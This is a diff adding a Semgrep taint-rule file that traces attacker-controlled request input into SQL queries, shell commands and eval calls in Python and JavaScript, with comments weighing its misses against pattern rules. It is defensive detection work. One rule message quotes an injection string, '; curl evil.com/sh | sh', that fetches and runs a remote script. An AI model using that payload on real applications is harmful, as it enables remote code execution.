@@ -1,0 +1,320 @@
+# =============================================================================
+# taint_flows.yaml -- dataflow rules: does attacker input REACH a dangerous sink?
+# =============================================================================
+#
+# HOW THIS DIFFERS FROM vibe_patterns.yaml
+#   The pattern rules ask "does this line look dangerous?". These ask "can a
+#   value the attacker controls actually arrive here, and was it neutralised on
+#   the way?" That difference is the whole point, and it cuts both ways.
+#
+# MEASURED, ON THE SAME FIXTURES
+#   test_targets/safe_but_flagged.py is genuinely safe code that Semgrep's
+#   pattern rules over-fire on -- 5 findings, every one false, each costing an
+#   API call for the explainer to dismiss.
+#
+#       pattern rules : 5 findings, 5 false, ~10 cents per run to clear
+#       taint rules   : 0 findings, no model call, free
+#
+#   Because `int()` and an allowlist membership test are declared as sanitizers
+#   below, the rule *knows* those values are safe. That knowledge used to live
+#   only in the model's answer, and had to be re-purchased on every run.
+#
+# THE COST, STATED PLAINLY
+#   Taint fails in the opposite direction from pattern matching. On
+#   test_targets/vulnerable.py these rules catch the SQL injection at line 271
+#   and miss the ones at 96 and 112 -- because those sit in plain helper
+#   functions (`def get_user(user_id):`) with no decorator and no request call.
+#   Nothing in the file says that parameter is attacker-controlled, so there is
+#   no source to start from.
+#
+#       pattern rules : 3 of 3 SQL injections
+#       taint rules   : 1 of 3
+#
+#   Over-firing annoys people. Silently missing is worse, it just does not feel
+#   worse. So these rules ADD a high-confidence tier; they do not replace
+#   vibe_patterns.yaml, and running only these would be a downgrade.
+#
+# HOW analyze.py USES THE DIFFERENCE
+#   metadata.confidence: high marks a proven flow -- source, sink, and no
+#   sanitizer between them. Those do not need the model's judgment about
+#   whether they are reachable; the analysis already answered that.
+#
+# RUN
+#   semgrep --config rules/ <target>        # everything, patterns included
+#   semgrep --config rules/taint_flows.yaml <target>   # these alone
+# =============================================================================
+
+rules:
+
+  # ===========================================================================
+  # PYTHON -- untrusted input reaching a SQL query
+  # ===========================================================================
+  - id: taint-py-sql-injection
+    languages: [python]
+    severity: ERROR
+    mode: taint
+    message: >-
+      Attacker-controlled input reaches a SQL query with no sanitisation in
+      between. Unlike a pattern match, this is a traced dataflow: the value
+      starts at a request and arrives in the query text. Use a parameterised
+      query -- cursor.execute("... WHERE id = ?", (value,)) -- so the driver
+      sends the statement and the data on separate channels.
+    metadata:
+      category: security
+      cwe: "CWE-89: SQL Injection"
+      confidence: high
+      analysis: taint
+      vibe-reason: "Models build SQL with f-strings because that is how they build every other string."
+    pattern-sources:
+      - pattern: request.args.get(...)
+      - pattern: request.args[...]
+      - pattern: request.form.get(...)
+      - pattern: request.form[...]
+      - pattern: request.get_json(...)
+      - pattern: request.json
+      - pattern: request.values.get(...)
+      - pattern: request.cookies.get(...)
+      - pattern: request.headers.get(...)
+      # Parameters of a decorated route handler: Flask and FastAPI bind URL
+      # segments straight to them, so they are attacker-controlled even though
+      # no request object is named.
+      - patterns:
+          - pattern-inside: |
+              @$APP.$METHOD(...)
+              def $F(..., $P, ...):
+                  ...
+          - pattern: $P
+    pattern-sanitizers:
+      # int() cannot carry a quote character, so the value can no longer alter
+      # the statement. This is the single most common false positive in the
+      # whole category and it is now answered by the rule, not by the model.
+      - pattern: int(...)
+      - pattern: float(...)
+      - pattern: $X.isdigit()
+      # An allowlist membership test: only developer-chosen literals survive it.
+      - patterns:
+          - pattern-inside: |
+              if $VAL not in $ALLOWED:
+                  return ...
+              ...
+          - pattern: $VAL
+    pattern-sinks:
+      - pattern: $CURSOR.execute(...)
+      - pattern: $CURSOR.executemany(...)
+      - pattern: $CONN.executescript(...)
+      - pattern: $DB.raw(...)
+
+  # ===========================================================================
+  # PYTHON -- untrusted input reaching a shell
+  # ===========================================================================
+  - id: taint-py-command-injection
+    languages: [python]
+    severity: ERROR
+    mode: taint
+    message: >-
+      Attacker-controlled input reaches a shell command. An attacker appends
+      "; curl evil.com/sh | sh" and runs arbitrary commands as your app's user.
+      Pass a list of arguments and drop shell=True -- with no shell involved
+      there is no shell syntax to inject.
+    metadata:
+      category: security
+      cwe: "CWE-78: OS Command Injection"
+      confidence: high
+      analysis: taint
+      vibe-reason: "shell=True is what makes a one-line subprocess example work."
+    pattern-sources:
+      - pattern: request.args.get(...)
+      - pattern: request.args[...]
+      - pattern: request.form.get(...)
+      - pattern: request.get_json(...)
+      - pattern: request.json
+      - patterns:
+          - pattern-inside: |
+              @$APP.$METHOD(...)
+              def $F(..., $P, ...):
+                  ...
+          - pattern: $P
+    pattern-sanitizers:
+      # shlex.quote produces a single shell-safe token.
+      - pattern: shlex.quote(...)
+      - pattern: int(...)
+    pattern-sinks:
+      # os.system and os.popen always invoke a shell, so the call itself is the
+      # sink. subprocess only does when shell=True -- passing an argument list
+      # spawns the program directly, with no shell to inject into. Matching a
+      # bare subprocess.run(...) flagged the *correct* pattern as the bug:
+      # subprocess.run(["ping", "-c", "1", host]) is the recommended fix, not
+      # a vulnerability.
+      - pattern: os.system(...)
+      - pattern: os.popen(...)
+      - pattern: subprocess.run($CMD, ..., shell=True, ...)
+      - pattern: subprocess.call($CMD, ..., shell=True, ...)
+      - pattern: subprocess.Popen($CMD, ..., shell=True, ...)
+      - pattern: subprocess.check_output($CMD, ..., shell=True, ...)
+
+  # ===========================================================================
+  # PYTHON -- untrusted input reaching the interpreter
+  # ===========================================================================
+  - id: taint-py-code-execution
+    languages: [python]
+    severity: ERROR
+    mode: taint
+    message: >-
+      Attacker-controlled input reaches eval() or exec(). This is remote code
+      execution: whatever the attacker sends runs in your process. Parse the
+      value instead of executing it.
+    metadata:
+      category: security
+      cwe: "CWE-95: Eval Injection"
+      confidence: high
+      analysis: taint
+      vibe-reason: "'Build a calculator endpoint' has a three-line eval answer and a fifty-line parser answer."
+    pattern-sources:
+      - pattern: request.args.get(...)
+      - pattern: request.args[...]
+      - pattern: request.form.get(...)
+      - pattern: request.get_json(...)
+      - pattern: request.json
+      - patterns:
+          - pattern-inside: |
+              @$APP.$METHOD(...)
+              def $F(..., $P, ...):
+                  ...
+          - pattern: $P
+    pattern-sanitizers:
+      - pattern: int(...)
+      - pattern: float(...)
+      - pattern: ast.literal_eval(...)
+    pattern-sinks:
+      - pattern: eval(...)
+      - pattern: exec(...)
+
+  # ===========================================================================
+  # JAVASCRIPT / TYPESCRIPT -- untrusted input reaching a SQL query
+  # ===========================================================================
+  - id: taint-js-sql-injection
+    languages: [javascript, typescript]
+    severity: ERROR
+    mode: taint
+    message: >-
+      Attacker-controlled input reaches a SQL query with no sanitisation in
+      between -- a traced dataflow, not a shape match. Use a parameterised
+      query: db.query("SELECT ... WHERE id = ?", [value]).
+    metadata:
+      category: security
+      cwe: "CWE-89: SQL Injection"
+      confidence: high
+      analysis: taint
+      vibe-reason: "Template literals are how modern JS builds every string, including SQL."
+    pattern-sources:
+      # $REQ is constrained because a bare `$REQ.query` matches ANY object's
+      # .query property -- including `db.query`, which made the sink its own
+      # source and flagged every constant query in the file.
+      - patterns:
+          - pattern-either:
+              - pattern: $REQ.query
+              - pattern: $REQ.query.$F
+              - pattern: $REQ.body
+              - pattern: $REQ.body.$F
+              - pattern: $REQ.params
+              - pattern: $REQ.params.$F
+              - pattern: $REQ.headers.$F
+              - pattern: $REQ.cookies.$F
+          - metavariable-regex:
+              metavariable: $REQ
+              regex: ^(req|request|ctx|context|event)$
+    pattern-sanitizers:
+      - pattern: parseInt(...)
+      - pattern: parseFloat(...)
+      - pattern: Number(...)
+      - patterns:
+          - pattern-inside: |
+              if (!$ALLOWED.includes($VAL)) { ... }
+              ...
+          - pattern: $VAL
+    pattern-sinks:
+      # focus-metavariable narrows the sink to the query string itself. Without
+      # it, db.query('SELECT ... WHERE id = ?', [req.query.id]) is flagged --
+      # but that is the parameterised form, i.e. the recommended fix. The value
+      # travels in the parameter array, never in the statement.
+      - patterns:
+          - pattern-either:
+              - pattern: $DB.query($SQL, ...)
+              - pattern: $DB.execute($SQL, ...)
+              - pattern: $DB.raw($SQL, ...)
+              - pattern: $DB.$queryRawUnsafe($SQL, ...)
+          - focus-metavariable: $SQL
+
+  # ===========================================================================
+  # JAVASCRIPT / TYPESCRIPT -- untrusted input reaching a shell
+  # ===========================================================================
+  - id: taint-js-command-injection
+    languages: [javascript, typescript]
+    severity: ERROR
+    mode: taint
+    message: >-
+      Attacker-controlled input reaches a shell command. Use execFile() or
+      spawn() with an argument array -- neither involves a shell, so there is no
+      shell syntax to inject.
+    metadata:
+      category: security
+      cwe: "CWE-78: OS Command Injection"
+      confidence: high
+      analysis: taint
+      vibe-reason: "exec() with a template literal is what makes a one-line shell example work."
+    pattern-sources:
+      - patterns:
+          - pattern-either:
+              - pattern: $REQ.query
+              - pattern: $REQ.query.$F
+              - pattern: $REQ.body
+              - pattern: $REQ.body.$F
+              - pattern: $REQ.params
+              - pattern: $REQ.params.$F
+          - metavariable-regex:
+              metavariable: $REQ
+              regex: ^(req|request|ctx|context|event)$
+    pattern-sanitizers:
+      - pattern: parseInt(...)
+      - pattern: Number(...)
+    pattern-sinks:
+      - pattern: $CP.exec(...)
+      - pattern: $CP.execSync(...)
+      - pattern: exec(...)
+      - pattern: execSync(...)
+
+  # ===========================================================================
+  # JAVASCRIPT / TYPESCRIPT -- untrusted input reaching the interpreter
+  # ===========================================================================
+  - id: taint-js-code-execution
+    languages: [javascript, typescript]
+    severity: ERROR
+    mode: taint
+    message: >-
+      Attacker-controlled input reaches eval() or new Function(). This is remote
+      code execution. Parse the value instead of executing it.
+    metadata:
+      category: security
+      cwe: "CWE-95: Eval Injection"
+      confidence: high
+      analysis: taint
+      vibe-reason: "new Function is what a model reaches for when told to avoid eval."
+    pattern-sources:
+      - patterns:
+          - pattern-either:
+              - pattern: $REQ.query
+              - pattern: $REQ.query.$F
+              - pattern: $REQ.body
+              - pattern: $REQ.body.$F
+              - pattern: $REQ.params
+              - pattern: $REQ.params.$F
+          - metavariable-regex:
+              metavariable: $REQ
+              regex: ^(req|request|ctx|context|event)$
+    pattern-sanitizers:
+      - pattern: parseInt(...)
+      - pattern: Number(...)
+      - pattern: JSON.parse(...)
+    pattern-sinks:
+      - pattern: eval(...)
+      - pattern: new Function(...)
